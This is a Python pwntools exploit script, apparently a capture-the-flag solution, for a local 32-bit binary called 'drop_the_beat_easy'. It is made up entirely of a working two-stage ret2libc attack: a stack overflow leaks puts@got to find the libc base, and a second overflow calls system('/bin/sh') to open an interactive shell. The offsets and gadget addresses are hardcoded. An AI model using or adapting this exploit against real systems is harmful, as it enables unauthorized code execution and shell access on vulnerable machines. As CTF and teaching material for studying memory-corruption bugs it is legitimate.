from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./drop_the_beat_easy"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x0
        continue
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"A" * 104
payload += p32(0x080483e0)    # puts@plt
payload += p32(0x0804853b)    # main
payload += p32(0x0804a010)    # puts@got

p.recvuntil("2) No Beat For You..!\n")
p.sendline("1")
p.recvuntil("Give Me a Beat!!\n")
p.sendline(payload)
p.recvuntil("Wow... That's AWESOME!\n")
puts_got = u32(p.recv(4))
log.info("puts@got: 0x{:08x}".format(puts_got))
libc_base = puts_got - 0x67b40
log.info("libc_base: 0x{:08x}".format(libc_base))
system_addr = libc_base + 0x3d200
log.info("sytem_addr: 0x{:08x}".format(system_addr))
binsh_addr = libc_base + 0x17e0cf
log.info("binsh_addr: 0x{:08x}".format(binsh_addr))

payload2 = b""
payload2 += b"A" * 104
payload2 += p32(system_addr)    # system@plt
payload2 += p32(0xdeadbeef)     # dummy
payload2 += p32(binsh_addr)     # /bin/sh

p.recvuntil("2) No Beat For You..!\n")
p.sendline("1")
p.recvuntil("Give Me a Beat!!\n")
p.sendline(payload2)
p.recvuntil("Wow... That's AWESOME!\n")

p.interactive()
